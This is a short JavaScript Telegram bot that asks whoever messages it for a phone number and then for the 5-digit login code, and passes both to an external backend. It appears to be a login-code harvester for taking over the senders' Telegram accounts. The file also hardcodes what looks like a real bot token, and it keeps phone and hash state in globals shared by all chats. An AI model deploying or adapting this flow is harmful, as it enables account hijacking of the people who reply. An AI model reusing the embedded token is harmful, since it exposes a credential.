import TelegramBot from 'node-telegram-bot-api';
import api from './api';

const token = '7354079571:AAFmkl1cFIWL6SVFI2UGFjzl4y5brmykOro';
const bot = new TelegramBot(token, { polling: true });

let phone = '';
let phone_code_hash = '';
const COMMANDS = {
  start: /\/start/,
};

bot.onText(COMMANDS.start, msg => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Welcome! Send your phone number to receive a code.');
});

bot.on('message', async msg => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (text?.startsWith('/')) return;

  if (text?.startsWith('+')) {
    const data = await api.sendCode(text);
    await bot.sendMessage(chatId, data?.message || data?.detail.message);
    phone_code_hash = data.phone_code_hash
    phone = text;
  } else if (text?.length === 5 && !isNaN(Number(text))) {
    const data = await api.verifyCode(phone, text,phone_code_hash);
    await bot.sendMessage(chatId, data?.message || data?.detail.message);
    phone = '';
  } else {
    bot.sendMessage(chatId, 'Invalid phone number or code. Try again.');
  }
});

bot.on('polling_error', error => console.error('Polling error:', error));

console.log('Bot is running!');
